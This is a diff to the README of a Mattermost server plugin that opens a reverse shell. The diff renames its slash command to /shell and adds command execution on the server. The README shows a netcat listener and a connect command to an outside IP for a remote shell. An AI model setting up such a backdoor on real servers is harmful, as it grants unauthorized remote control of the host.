@@ -1,6 +1,6 @@
 # Mattermost Reverse Shell plugin
 
-This plugin implements a reverse shell as a server plugin.
+This plugin implements a reverse shell as a server plugin. Also, you can execute commands and have the plugin post the stdout, stderr of the command as a message.
 
 ## Why?
 
@@ -19,5 +19,7 @@ nc -lvp 1337
 
 and connect
 ```
-/reverse-shell connect 1.2.3.4 1337
+/shell connect 1.2.3.4 1337
 ```
+
+Also, you can execute commands on the server! `/shell exec command [args]`
